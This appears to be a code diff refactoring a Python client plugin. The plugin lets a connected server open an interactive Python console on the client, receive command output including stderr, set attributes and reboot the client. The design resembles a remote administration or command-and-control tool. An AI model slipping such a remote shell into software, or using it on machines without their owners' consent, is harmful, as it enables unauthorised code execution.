@@ -7,7 +7,9 @@ from code import InteractiveConsole
 
 
 class FileCacher:
-    "Cache the stdout text so we can analyze it before returning it"
+    """
+    Cache the stdout/stderr text so we can analyze it before returning it.
+    """
     def __init__(self):
         self.out = []
         self.reset()
@@ -25,29 +27,29 @@ class FileCacher:
 
 
 class Shell(InteractiveConsole):
-    "Wrapper around Python that can filter input/output to the shell"
+    """
+    Wrapper around InteractiveConsole so stdout and stderr can be intercepted easily.
+    """
     def __init__(self, locals=None, filename='<console>'):
         self.stdout = sys.stdout
+        self.stderr = sys.stderr
         self.cache = FileCacher()
         super(Shell, self).__init__(locals=locals, filename=filename)
         return
 
     def get_output(self):
         sys.stdout = self.cache
+        sys.stderr = self.cache
 
     def return_output(self):
         sys.stdout = self.stdout
+        sys.stderr = self.stderr
 
     def push(self, line):
         self.get_output()
-        # you can filter input here by doing something like
-        # line = filter(line)
         InteractiveConsole.push(self, line)
         self.return_output()
         output = self.cache.flush().strip()
-        # you can filter the output here by doing something like
-        # output = filter(output)
-        # or do something else with it
         print(output)
         return output
 
@@ -63,17 +65,11 @@ class Plugin(object):
         if not args:
             client.server_print('< The `client` command requires an argument. >')
 
+        # Create an interactive shell for the server.
         if args[0] == '-i':
+            # Tell the server the client got the command.
             client.send_data('')
-            console = Shell(locals={'client': client, 'data': data})
-            while True:
-                command = client.receive_data()
-                if command == 'exit()':
-                    client.server_print('< InteractiveConsole shutting down. >')
-                    break
-                output = console.push(command)
-                client.send_data(output)
-            return
+            return Plugin.python_shell(client, data)
 
         # Set an attribute on the Client instance.
         if args[0] == '-s':
@@ -113,6 +109,23 @@ class Plugin(object):
             client.send_data('')
             Plugin.reboot_client(client)
             sys.exit()
+
+    @staticmethod
+    def python_shell(client, data):
+        # Create a InteractiveConsole instance.
+        console = Shell(locals={'client': client, 'data': data})
+        while True:
+            # Receive a command.
+            command = client.receive_data()
+            # Check for the exit.
+            if command == 'exit()':
+                client.server_print('< InteractiveConsole shutting down. >')
+                break
+            # Push the command onto the InteractiveConsole instance.
+            output = console.push(command)
+            # Send the result back.
+            client.send_data(output)
+        return
 
     @staticmethod
     def reboot_client(client):
